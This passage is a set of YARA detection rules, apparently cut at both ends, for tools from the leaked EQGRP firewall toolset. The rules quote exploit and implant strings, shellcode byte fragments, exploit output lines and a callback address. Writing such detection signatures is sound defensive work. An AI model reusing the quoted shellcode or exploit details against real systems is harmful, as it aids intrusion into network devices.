reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "dd0e3ae6e1039a755bf6cb28bf726b4d6ab4a1da2392ba66d114a43a55491eb1"
hash2 = "dd0e3ae6e1039a755bf6cb28bf726b4d6ab4a1da2392ba66d114a43a55491eb1"
strings:
$s1 = "logging.error(\"       Perhaps you should run with --scan?\")" fullword ascii
$s2 = "logging.error(\"ERROR: No entry for ETag [%s] in %s.\" %" fullword ascii
$s3 = "\"be supplied\")" fullword ascii
condition:
( filesize < 70KB and 2 of ($s*) ) or ( all of them )
}
rule SSC_EQGRP_bo
{
meta:
description = "EQGRP Toolset Firewall - file bo"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "aa8b363073e8ae754b1836c30f440d7619890ded92fb5b97c73294b15d22441d"
strings:
$s1 = "ERROR: failed to open %s: %d" fullword ascii
$s2 = "__libc_start_main@@GLIBC_2.0" fullword ascii
$s3 = "serial number: %s" fullword ascii
$s4 = "strerror@@GLIBC_2.0" fullword ascii
$s5 = "ERROR: mmap failed: %d" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 20KB and all of them )
}
rule SSC_EQGRP_BananaUsurper_writeJetPlow
{
meta:
description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, writeJetPlow-2130"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
hash2 = "464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c"
strings:
$x1 = "Implant Version-Specific Values:" fullword ascii
$x2 = "This function should not be used with a Netscreen, something has gone horribly wrong" fullword ascii
$s1 = "createSendRecv: recv'd an error from the target." fullword ascii
$s2 = "Error: WatchDogTimeout read returned %d instead of 4" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 2000KB and 1 of ($x*) ) or ( 3 of them )
}
rule SSC_EQGRP_callbacks
{
meta:
description = "EQGRP Toolset Firewall - Callback addresses"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
strings:
$s1 = "30.40.50.60:9342" fullword ascii wide /* DoD */
condition:
1 of them
}
rule SSC_EQGRP_hexdump
{
meta:
description = "EQGRP Toolset Firewall - file hexdump.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "95a9a6a8de60d3215c1c9f82d2d8b2640b42f5cabdc8b50bd1f4be2ea9d7575a"
strings:
$s1 = "def hexdump(x,lead=\"[+] \",out=sys.stdout):" fullword ascii
$s2 = "print >>out, \"%s%04x  \" % (lead,i)," fullword ascii
$s3 = "print >>out, \"%02X\" % ord(x[i+j])," fullword ascii
$s4 = "print >>out, sane(x[i:i+16])" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 1KB and 2 of ($s*) ) or ( all of them )
}
rule SSC_EQGRP_BPIE
{
meta:
description = "EQGRP Toolset Firewall - file BPIE-2201.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "697e80cf2595c85f7c931693946d295994c55da17a400f2c9674014f130b4688"
strings:
$s1 = "profProcessPacket" fullword ascii
$s2 = ".got_loader" fullword ascii
$s3 = "getTimeSlotCmdHandler" fullword ascii
$s4 = "getIpIpCmdHandler" fullword ascii
$s5 = "LOADED" fullword ascii
$s6 = "profStartScan" fullword ascii
$s7 = "tmpData.1" fullword ascii
$s8 = "resetCmdHandler" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 70KB and 6 of ($s*) )
}
rule SSC_EQGRP_jetplow_SH
{
meta:
description = "EQGRP Toolset Firewall - file jetplow.sh"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "ee266f84a1a4ccf2e789a73b0a11242223ed6eba6868875b5922aea931a2199c"
strings:
$s1 = "cd /current/bin/FW/BANANAGLEE/$bgver/Install/LP/jetplow" fullword ascii
$s2 = "***** Please place your UA in /current/bin/FW/OPS *****" fullword ascii
$s3 = "ln -s ../jp/orig_code.bin orig_code_pixGen.bin" fullword ascii
$s4 = "*****             Welcome to JetPlow              *****" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_Implants_Gen1
{
meta:
description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, lpexe, writeJetPlow-2130"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
hash2 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
hash3 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
hash4 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
hash5 = "8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2"
hash6 = "6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3"
hash7 = "d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f"
hash8 = "ee3e3487a9582181892e27b4078c5a3cb47bb31fc607634468cc67753f7e61d7"
hash9 = "464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c"
strings:
$s1 = "WARNING:  Session may not have been closed!" fullword ascii
$s2 = "EXEC Packet Processed" fullword ascii
$s3 = "Failed to insert the command into command list." fullword ascii
$s4 = "Send_Packet: Trying to send too much data." fullword ascii
$s5 = "payloadLength >= MAX_ALLOW_SIZE." fullword ascii
$s6 = "Wrong Payload Size" fullword ascii
$s7 = "Unknown packet received......" fullword ascii
$s8 = "Returned eax = %08x" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 6000KB and ( 2 of ($s*) ) ) or ( 5 of them )
}
rule SSC_EQGRP_sniffer_xml2pcap
{
meta:
description = "EQGRP Toolset Firewall - file sniffer_xml2pcap"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "f5e5d75cfcd86e5c94b0e6f21bbac886c7e540698b1556d88a83cc58165b8e42"
strings:
$x1 = "-s/--srcip <sourceIP>  Use given source IP (if sniffer doesn't collect source IP)" fullword ascii
$x2 = "convert an XML file generated by the BLATSTING sniffer module into a pcap capture file." fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_bc_genpkt
{
meta:
description = "Detects tool from EQGRP toolset - file bc-genpkt"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
strings:
$x1 = "load auxiliary object=%s requested by file=%s" fullword ascii
$x2 = "size of new packet, should be %d <= size <= %d bytes" fullword ascii
$x3 = "verbosity - show lengths, packet dumps, etc" fullword ascii
$s1 = "%s: error while loading shared libraries: %s%s%s%s%s" fullword ascii
$s2 = "cannot dynamically load executable" fullword ascii
$s3 = "binding file %s to %s: %s symbol `%s' [%s]" fullword ascii
$s4 = "randomize the initiator cookie" fullword ascii
condition:
uint16(0) == 0x457f and filesize < 1000KB and ( 1 of ($s*) and 3 of them )
}
rule SSC_EQGRP_RC5_RC6_Opcode
{
meta:
description = "EQGRP Toolset Firewall - RC5 / RC6 opcode"
author = "Florian Roth"
reference = "https://securelist.com/blog/incidents/75812/the-equation-giveaway/"
date = "2016-08-17"
strings:
/*
mov     esi, [ecx+edx*4-4]
sub     esi, 61C88647h
mov     [ecx+edx*4], esi
inc     edx
cmp     edx, 2Bh
*/
$s1 = { 8B 74 91 FC 81 EE 47 86 C8 61 89 34 91 42 83 FA 2B }
condition:
1 of them
}
rule SSC_EQGRP_BICECREAM
{
meta:
description = "EQGRP Toolset Firewall - file BICECREAM-2140"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "4842076af9ba49e6dfae21cf39847b4172c06a0bd3d2f1ca6f30622e14b77210"
strings:
$s1 = "Could not connect to target device: %s:%d. Please check IP address." fullword ascii
$s2 = "command data size is invalid for an exec cmd" fullword ascii
$s3 = "A script was specified but target is not a PPC405-based NetScreen (NS5XT, NS25, and NS50). Executing scripts is supported but ma" ascii
$s4 = "Execute 0x%08x with args (%08x, %08x, %08x, %08x): [y/n]" fullword ascii
$s5 = "Execute 0x%08x with args (%08x, %08x, %08x): [y/n]" fullword ascii
$s6 = "[%d] Execute code." fullword ascii
$s7 = "Execute 0x%08x with args (%08x): [y/n]" fullword ascii
$s8 = "dump_value_LHASH_DOALL_ARG" fullword ascii
$s9 = "Eggcode is complete. Pass execution to it? [y/n]" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 5000KB and 2 of them ) or ( 5 of them )
}
rule SSC_EQGRP_ssh_telnet_29
{
meta:
description = "EQGRP Toolset Firewall - from files ssh.py, telnet.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "630d464b1d08c4dfd0bd50552bee2d6a591fb0b5597ecebaa556a3c3d4e0aa4e"
hash2 = "07f4c60505f4d5fb5c4a76a8c899d9b63291444a3980d94c06e1d5889ae85482"
strings:
$s1 = "received prompt, we're in" fullword ascii
$s2 = "failed to login, bad creds, abort" fullword ascii
$s3 = "sending command \" + str(n) + \"/\" + str(tot) + \", len \" + str(len(chunk) + " fullword ascii
$s4 = "received nat - EPBA: ok, payload: mangled, did not run" fullword ascii
$s5 = "no status returned from target, could be an exploit failure, or this is a version where we don't expect a stus return" ascii
$s6 = "received arp - EPBA: ok, payload: fail" fullword ascii
$s7 = "chopped = string.rstrip(payload, \"\\x0a\")" fullword ascii
condition:
( filesize < 10KB and 2 of them ) or ( 3 of them )
}
rule SSC_EQGRP_Implants_Gen3
{
meta:
description = "EQGRP Toolset Firewall - from files BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
hash2 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
hash3 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
hash4 = "8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2"
hash5 = "6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3"
hash6 = "d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f"
strings:
$x1 = "incomplete and must be removed manually.)" fullword ascii
$s1 = "%s: recv'd an error from the target." fullword ascii
$s2 = "Unable to fetch the address to the get_uptime_secs function for this OS version" fullword ascii
$s3 = "upload/activate/de-activate/remove/cmd function failed" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 6000KB and 2 of them ) or ( all of them )
}
rule SSC_EQGRP_StoreFc
{
meta:
description = "EQGRP Toolset Firewall - file StoreFc.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "f155cce4eecff8598243a721389046ae2b6ca8ba6cb7b4ac00fd724601a56108"
strings:
$x1 = "Usage: StoreFc.py --configFile=<path to xml file> --implantFile=<path to BinStore implant> [--outputFile=<file to write the conf" ascii
$x2 = "raise Exception, \"Must supply both a config file and implant file.\"" fullword ascii
$x3 = "This is wrapper for Store.py that FELONYCROWBAR will use. This" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_eligiblecandidate
{
meta:
description = "EQGRP Toolset Firewall - file eligiblecandidate.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "c4567c00734dedf1c875ecbbd56c1561a1610bedb4621d9c8899acec57353d86"
strings:
$o1 = "Connection timed out. Only a problem if the callback was not received." fullword ascii
$o2 = "Could not reliably detect cookie. Using 'session_id'..." fullword ascii
$c1 = "def build_exploit_payload(self,cmd=\"/tmp/httpd\"):" fullword ascii
$c2 = "self.build_exploit_payload(cmd)" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_shellcode
{
meta:
description = "EQGRP Toolset Firewall - file shellcode.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "ac9decb971dd44127a6ca0d35ac153951f0735bb4df422733046098eca8f8b7f"
strings:
$s1 = "execute_post = '\\xe8\\x00\\x00\\x00\\x00\\x5d\\xbe\\xef\\xbe\\xad\\xde\\x89\\xf7\\x89\\xec\\x29\\xf4\\xb8\\x03\\x00\\x00\\x00" ascii
$s2 = "tiny_exec = '\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x03\\x00\\x01\\x00\\x00" ascii
$s3 = "auth_id = '\\x31\\xc0\\xb0\\x03\\x31\\xdb\\x89\\xe1\\x31\\xd2\\xb6\\xf0\\xb2\\x0d\\xcd\\x80\\x3d\\xff\\xff\\xff\\xff\\x75\\x07" ascii
$c1 = { e8 00 00 00 00 5d be ef be ad de 89 f7 89 ec 29 f4 b8 03 00 00 00 }
/* $c2 = { 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 02 00 03 00 01 00 00 }  too many fps */
$c3 = { 31 c0 b0 03 31 db 89 e1 31 d2 b6 f0 b2 0d cd 80 3d ff ff ff ff 75 07 }
condition:
1 of them
}
rule SSC_EQGRP_Unique_Strings
{
meta:
description = "EQGRP Toolset Firewall - Unique strings"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
strings:
$s1 = "/BananaGlee/ELIGIBLEBOMB" ascii
$s2 = "Protocol must be either http or https (Ex: https://1.2.3.4:1234)"
condition:
1 of them
}
rule SSC_EQGRP_Extrabacon_Output
{
meta:
description = "EQGRP Toolset Firewall - Extrabacon exploit output"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
strings:
$s1 = "|###[ SNMPresponse ]###" fullword ascii
$s2 = "[+] generating exploit for exec mode pass-disable" fullword ascii
$s3 = "[+] building payload for mode pass-disable" fullword ascii
$s4 = "[+] Executing:  extrabacon" fullword ascii
$s5 = "appended AAAADMINAUTH_ENABLE payload" fullword ascii
condition:
2 of them
}
rule SSC_EQGRP_tinyexec
{
meta:
description = "EQGRP Toolset Firewall - from files tinyexec"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
strings:
$s1 = { 73 68 73 74 72 74 61 62 00 2E 74 65 78 74 }
$s2 = { 5A 58 55 52 89 E2 55 50 89 E1 }
condition:
uint32(0) == 0x464c457f and filesize < 270 and all of them
}
rule SSC_EQGRP_pandarock
{
meta:
description = "EQGRP Toolset Firewall - from files pandarock_v1.11.1.1.bin, pit"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "1214e282ac7258e616ebd76f912d4b2455d1b415b7216823caa3fc0d09045a5f"
hash2 = "c8a151df7605cb48feb8be2ab43ec965b561d2b6e2a837d645fdf6a6191ab5fe"
strings:
$x1 = "* Not attempting to execute \"%s\" command" fullword ascii
$x2 = "TERMINATING SCRIPT (command error or \"quit\" encountered)" fullword ascii
$x3 = "execute code in <file> passing <argX> (HEX)" fullword ascii
$x4 = "* Use arrow keys to scroll through command history" fullword ascii
$s1 = "pitCmd_processCmdLine" fullword ascii
$s2 = "execute all commands in <file>" fullword ascii
$s3 = "__processShellCmd" fullword ascii
$s4 = "pitTarget_getDstPort" fullword ascii
$s5 = "__processSetTargetIp" fullword ascii
$o1 = "Logging commands and output - ON" fullword ascii
$o2 = "This command is too dangerous.  If you'd like to run it, contact the development team" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 3000KB and 1 of ($x*) ) or ( 4 of them ) or 1 of ($o*)
}
rule SSC_EQGRP_BananaAid
{
meta:
description = "EQGRP Toolset Firewall - file BananaAid"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "7a4fb825e63dc612de81bc83313acf5eccaa7285afc05941ac1fef199279519f"
strings:
$x1 = "(might have to delete key in ~/.ssh/known_hosts on linux box)" fullword ascii
$x2 = "scp BGLEE-" ascii
$x3 = "should be 4bfe94b1 for clean bootloader version 3.0; " fullword ascii
$x4 = "scp <configured implant> <username>@<IPaddr>:onfig" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_Implants_Gen6
{
meta:
description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
hash2 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
hash3 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
hash4 = "8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2"
hash5 = "6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3"
hash6 = "d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f"
hash7 = "464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c"
strings:
$s1 = "LP.c:pixSecurity - Improper number of bytes read in Security/Interface Information" fullword ascii
$s2 = "LP.c:pixSecurity - Not in Session" fullword ascii
$s3 = "getModInterface__preloadedModules" fullword ascii
$s4 = "showCommands" fullword ascii
$s5 = "readModuleInterface" fullword ascii
$s6 = "Wrapping_Not_Necessary_Or_Wrapping_Ok" fullword ascii
$s7 = "Get_CMD_List" fullword ascii
$s8 = "LP_Listen2" fullword ascii
$s9 = "killCmdList" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 6000KB and all of them )
}
rule SSC_EQGRP_BUSURPER_3001_724
{
meta:
description = "EQGRP Toolset Firewall - file BUSURPER-3001-724.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "6b558a6b8bf3735a869365256f9f2ad2ed75ccaa0eefdc61d6274df4705e978b"
strings:
$s1 = "IMPLANT" fullword ascii
$s2 = "KEEPGOING" fullword ascii
$s3 = "upgrade_implant" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 200KB and 2 of them ) or ( all of them )
}
rule SSC_EQGRP_userscript
{
meta:
description = "EQGRP Toolset Firewall - file userscript.FW"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "5098ff110d1af56115e2c32f332ff6e3973fb7ceccbd317637c9a72a3baa43d7"
strings:
$x1 = "Are you sure? Don't forget that NETSCREEN firewalls require BANANALIAR!! " fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_tunnel_state_reader
{
meta:
description = "EQGRP Toolset Firewall - file tunnel_state_reader"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "49d48ca1ec741f462fde80da68b64dfa5090855647520d29e345ef563113616c"
strings:
$s1 = "Active connections will be maintained for this tunnel. Timeout:" fullword ascii
$s5 = "%s: compatible with BLATSTING version 1.2" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_teflondoor
{
meta:
description = "Detects tool from EQGRP toolset - file teflondoor.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
strings:
$x1 = "%s: abort.  Code is %d.  Message is '%s'" fullword ascii
$x2 = "%s: %li b (%li%%)" fullword ascii
$s1 = "no winsock" fullword ascii
$s2 = "%s: %s file '%s'" fullword ascii
$s3 = "peer: connect" fullword ascii
$s4 = "read: write" fullword ascii
$s5 = "%s: done!" fullword ascii
$s6 = "%s: %li b" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 30KB and 1 of ($x*) and 3 of them
}
rule SSC_EQGRP_BFLEA_2201
{
meta:
description = "EQGRP Toolset Firewall - file BFLEA-2201.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "15e8c743770e44314496c5f27b6297c5d7a4af09404c4aa507757e0cc8edc79e"
strings:
$s1 = ".got_loader" fullword ascii
$s2 = "LOADED" fullword ascii
$s3 = "readFlashHandler" fullword ascii
$s4 = "KEEPGOING" fullword ascii
$s5 = "flashRtnsPix6x.c" fullword ascii
$s6 = "fix_ip_cksum_incr" fullword ascii
$s7 = "writeFlashHandler" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 30KB and 5 of them ) or ( all of them )
}
rule SSC_EQGRP_sploit_py
{
meta:
description = "EQGRP Toolset Firewall - file sploit.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6"
strings:
$x1 = "the --spoof option requires 3 or 4 fields as follows redir_ip" ascii
$x2 = "[-] timeout waiting for response - target may have crashed" fullword ascii
$x3 = "[-] no response from health check - target may have crashed" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_BPATROL_2201
{
meta:
description = "EQGRP Toolset Firewall - file BPATROL-2201.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "aa892750b893033eed2fedb2f4d872f79421174eb217f0c34a933c424ae66395"
strings:
$s1 = "dumpConfig" fullword ascii
$s2 = "getstatusHandler" fullword ascii
$s3 = ".got_loader" fullword ascii
$s4 = "xtractdata" fullword ascii
$s5 = "KEEPGOING" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 40KB and all of them )
}
rule SSC_EQGRP_create_dns_injection
{
meta:
description = "EQGRP Toolset Firewall - file create_dns_injection.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "488f3cc21db0688d09e13eb85a197a1d37902612c3e302132c84e07bc42b1c32"
strings:
$s1 = "Name:   A hostname: 'host.network.com', a decimal numeric offset within" fullword ascii
$s2 = "-a www.badguy.net,CNAME,1800,host.badguy.net \\\\" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_screamingplow
{
meta:
description = "EQGRP Toolset Firewall - file screamingplow.sh"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "c7f4104c4607a03a1d27c832e1ebfc6ab252a27a1709015b5f1617b534f0090a"
strings:
$s1 = "What is the name of your PBD:" fullword ascii
$s2 = "You are now ready for a ScreamPlow" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_Implants_Gen4
{
meta:
description = "EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
hash2 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
hash3 = "8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2"
hash4 = "6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3"
strings:
$s1 = "Command has not yet been coded" fullword ascii
$s2 = "Beacon Domain  : www.%s.com" fullword ascii
$s3 = "This command can only be run on a PIX/ASA" fullword ascii
$s4 = "Warning! Bad or missing Flash values (in section 2 of .dat file)" fullword ascii
$s5 = "Printing the interface info and security levels. PIX ONLY." fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 3000KB and 3 of them ) or ( all of them )
}
rule SSC_EQGRP_dn_1_0_2_1
{
meta:
description = "Detects tool from EQGRP toolset - file dn.1.0.2.1.linux"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
strings:
$s1 = "Valid commands are: SMAC, DMAC, INT, PACK, DONE, GO" fullword ascii
$s2 = "invalid format suggest DMAC=00:00:00:00:00:00" fullword ascii
$s3 = "SMAC=%02x:%02x:%02x:%02x:%02x:%02x" fullword ascii
$s4 = "Not everything is set yet" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 30KB and 2 of them )
}
rule SSC_EQGRP_networkProfiler_orderScans
{
meta:
description = "EQGRP Toolset Firewall - file networkProfiler_orderScans.sh"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "ea986ddee09352f342ac160e805312e3a901e58d2beddf79cd421443ba8c9898"
strings:
$x1 = "Unable to save off predefinedScans directory" fullword ascii
$x2 = "Re-orders the networkProfiler scans so they show up in order in the LP" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_uninstallPBD
{
meta:
description = "EQGRP Toolset Firewall - file uninstallPBD.bat"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "692fdb449f10057a114cf2963000f52ce118d9a40682194838006c66af159bd0"
strings:
$s1 = "memset 00e9a05c 4 38845b88" fullword ascii
$s2 = "_hidecmd" fullword ascii
$s3 = "memset 013abd04 1 0d" fullword ascii
condition:
all of them
}
rule SSC_EQGRP_Implants_Gen5
{
meta:
description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
hash2 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
hash3 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
hash4 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
hash5 = "8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2"
hash6 = "6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3"
hash7 = "d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f"
hash8 = "464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c"
strings:
$x1 = "Module and Implant versions do not match.  This module is not compatible with the target implant" fullword ascii
$s1 = "%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.log" fullword ascii
$s2 = "%s/BF_%04d%02d%02d.log" fullword ascii
$s3 = "%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.bin" fullword ascii
condition:
( uint16(0) == 0x457f and 1 of ($x*) ) or ( all of them )
}
rule SSC_EQGRP_Implants_Gen2
{
meta:
description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, writeJetPlow-2130"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
hash2 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
hash3 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
hash4 = "8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2"
hash5 = "6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3"
hash6 = "464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c"
strings:
$x1 = "Modules persistence file written successfully" fullword ascii
$x2 = "Modules persistence data successfully removed" fullword ascii
$x3 = "No Modules are active on the firewall, nothing to persist" fullword ascii
$s1 = "--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s " fullword ascii
$s2 = "Error while attemping to persist modules:" fullword ascii
$s3 = "Error while reading interface info from PIX" fullword ascii
$s4 = "LP.c:pixFree - Failed to get response" fullword ascii
$s5 = "WARNING: LP Timeout specified (%lu seconds) less than default (%u seconds).  Setting default" fullword ascii
$s6 = "Unable to fetch config address for this OS version" fullword ascii
$s7 = "LP.c: interface information not available for this session" fullword ascii
$s8 = "[%s:%s:%d] ERROR: " fullword ascii
$s9 = "extract_fgbg" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 3000KB and 1 of ($x*) ) or ( 5 of them )
}
rule SSC_EQGRP_sploit
{
meta:
description = "EQGRP Toolset Firewall - from files sploit.py, sploit.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6"
hash2 = "0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6"
strings:
$s1 = "print \"[+] Connecting to %s:%s\" % (self.params.dst['ip'], self.params.dst['port'])" fullword ascii
$s2 = "@overridable(\"Must be overriden if the target will be touched.  Base implementation should not be called.\")" fullword ascii
$s3 = "@overridable(\"Must be overriden.  Base implementation should not be called.\")" fullword ascii
$s4 = "exp.load_vinfo()" fullword ascii
$s5 = "if not okay and self.terminateFlingOnException:" fullword ascii
$s6 = "print \"[-] keyboard interrupt before response received\"" fullword ascii
$s7 = "if self.terminateFlingOnException:" fullword ascii
$s8 = "print 'Debug info ','='*40" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 90KB and 1 of ($s*) ) or ( 4 of them )
}
rule SSC_EQGRP_durablenapkin_solaris_2_0_1
{
meta:
description = "Detects tool from EQGRP toolset - file durablenapkin.solaris.2.0.1.1"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
strings:
$s1 = "recv_ack: %s: Service not supplied by provider" fullword ascii
$s2 = "send_request: putmsg \"%s\": %s" fullword ascii
$s3 = "port undefined" fullword ascii
$s4 = "recv_ack: %s getmsg: %s" fullword ascii
$s5 = ">> %d -- %d" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 40KB and 2 of them )
}
rule SSC_EQGRP_installdate
{
meta:
description = "Detects tool from EQGRP toolset - file installdate.pl"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
strings:
$x1 = "#Provide hex or EP log as command-line argument or as input" fullword ascii
$x2 = "print \"Gimme hex: \";" fullword ascii
